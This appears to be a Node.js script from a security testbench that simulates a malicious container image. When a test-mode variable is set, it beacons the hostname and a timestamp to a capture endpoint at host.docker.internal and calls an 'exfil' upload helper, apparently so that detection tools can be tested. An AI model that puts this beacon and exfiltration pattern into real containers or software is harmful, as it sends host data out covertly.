const http = require('http');
const os = require('os');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  console.log('TESTBENCH_MODE not enabled — benign exit.');
  process.exit(0);
}

const payload = JSON.stringify({ host: os.hostname(), ts: Date.now(), scenario: '14-container-image' });

const req = http.request({ hostname: 'host.docker.internal', port: 3002, path: '/capture', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': payload.length } }, () => {});
req.on('error', () => {});
req.write(payload);
req.end();

try {
  const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
  uploadJson('14', 'runtime-beacon', JSON.parse(payload));
} catch (_) {}

console.log('Malicious container started (simulated).');
setInterval(() => {}, 1000);

